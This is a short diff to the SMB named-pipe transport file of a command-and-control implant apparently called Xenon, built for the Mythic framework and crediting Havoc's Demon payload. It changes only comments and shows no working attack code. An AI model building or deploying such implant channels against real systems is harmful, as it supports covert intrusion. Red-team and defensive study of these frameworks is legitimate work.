@@ -1,7 +1,3 @@
-/*
-	SMB Named pipe comms
-*/
-
 #include "TransportSmb.h"
 
 #include "Xenon.h"
@@ -12,10 +8,13 @@
 /* This file is the the Mythic SMB profile */
 #ifdef SMB_TRANSPORT
 
+/*
+    Most code is based on Havoc 
+    @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
+*/
+
 /**
  * @brief Send data to SMB C2 Channel
- * 
- * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
  * 
  * @return BOOL  
  */
@@ -86,9 +85,8 @@ END:
 
 
 /**
- * @brief Read data from SMB C2 Channel
- * 
- * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c#L65
+ * @brief Read data from SMB C2 Channel (non-blocking)
+ *
  * @return BOOL  
  */
 BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
